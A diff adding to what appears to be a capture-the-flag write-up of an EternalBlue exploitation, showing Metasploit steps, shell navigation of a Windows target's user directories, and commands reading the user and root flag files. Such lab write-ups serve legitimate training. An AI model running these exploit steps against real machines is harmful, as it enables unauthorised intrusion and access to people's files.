@@ -44,4 +44,29 @@ Eternal Blue Exploit
 <pre>use 0</pre>
 <pre>set hosts</pre>
 <pre>run</pre>
+Success 
+![win](https://user-images.githubusercontent.com/66635295/171775665-bdea3385-c399-4edf-95da-e0d69317953c.png)
+
+**PRIVILEGE ESCALATION**
+---
+**Directories**
+<pre>shell</pre>
+<pre>cd C:/</pre>
+<pre>cd Users</pre>
+<pre>dir</pre>
+![haris](https://user-images.githubusercontent.com/66635295/171775908-10c655f3-e3d4-4331-82bb-fec08256fcff.png)
+
+**User Flag**
+<pre>cd haris</pre>
+<pre>cd Desktop</pre>
+<pre>dir</pre>
+<pre>type user.txt</pre>
+
+**Root Flag**
+<pre>cd C:/Users/Administrator</pre>
+<pre>cd Desktop</pre>
+<pre>dir</pre>
+<pre>type root.txt</pre>
+
+
 
